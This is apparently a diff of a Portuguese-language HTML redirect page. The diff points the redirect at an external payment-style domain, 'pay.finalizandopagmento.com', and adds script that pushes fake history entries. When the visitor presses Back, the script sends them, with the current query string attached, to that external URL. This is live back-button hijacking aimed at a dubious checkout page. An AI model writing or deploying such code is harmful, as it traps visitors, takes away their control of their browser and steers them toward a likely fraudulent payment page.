@@ -22,30 +22,40 @@
 
     
 
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecionamento</title>
     <script>
-        const link = '../back2/';
+        const link = 'https://pay.finalizandopagmento.com/PVYB34xAxwp3Kzk';
       
         function setBackRedirect(url) {
-          let urlBackRedirect = url;
-          urlBackRedirect = urlBackRedirect =
-            urlBackRedirect.trim() +
-            (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
-            document.location.search.replace('?', '').toString();
+            let urlBackRedirect = url;
+            urlBackRedirect = urlBackRedirect.trim() +
+                (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+                document.location.search.replace('?', '').toString();
       
-          history.pushState({}, '', location.href);
-          history.pushState({}, '', location.href);
-          history.pushState({}, '', location.href);
+            history.pushState({}, '', location.href); // Cria uma nova entrada no histórico
+            history.pushState({}, '', location.href); // Cria uma nova entrada no histórico
+            history.pushState({}, '', location.href); // Cria uma nova entrada no histórico
       
-          window.addEventListener('popstate', () => {
-            console.log('onpopstate', urlBackRedirect);
-            setTimeout(() => {
-              location.href = urlBackRedirect;
-            }, 1);
-          });
+            window.addEventListener('popstate', () => {
+                console.log('onpopstate', urlBackRedirect);
+                setTimeout(() => {
+                    location.href = urlBackRedirect;
+                }, 1);
+            });
         }
       
         setBackRedirect(link);
     </script>
+</head>
+<body>
+    <p>Redirecionando...</p>
+</body>
+</html>
+
     
     
     
